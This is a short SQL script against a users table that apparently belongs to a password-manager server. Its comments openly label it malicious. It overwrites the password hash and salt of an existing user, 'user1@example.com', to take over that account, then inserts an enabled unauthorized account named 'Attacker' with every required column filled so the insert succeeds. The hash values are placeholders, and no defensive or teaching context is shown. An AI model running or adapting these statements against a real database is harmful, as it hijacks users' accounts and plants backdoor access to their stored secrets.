-- Change password for user 'user1@example.com'
UPDATE public.users 
SET 
    password_hash = '\\xdeadbeef', -- New malicious password hash
    salt = '\\xdeadbeef', -- New salt
    updated_at = NOW()
WHERE email = 'user1@example.com';

-- Add a new, unauthorized user 'attacker@example.com'
-- We need to provide values for all NOT NULL columns without a default value.
INSERT INTO public.users (
    uuid, 
    created_at, 
    updated_at, 
    email, 
    name, 
    password_hash, 
    salt, 
    password_iterations,
    akey, 
    security_stamp, 
    equivalent_domains, 
    excluded_globals,
    enabled
)
VALUES (
    'a1b2c3d4-e5f6-7890-1234-567890abcdef', -- New UUID for the attacker
    NOW(), 
    NOW(), 
    'attacker@example.com', 
    'Attacker', 
    '\\xbadc0ffee', -- Attacker's password hash
    '\\xbadc0ffee', -- Attacker's salt
    100000, -- Password iterations
    'some_akey_value', -- akey
    'some_security_stamp', -- security_stamp
    '[]', 
    '[]',
    true
);
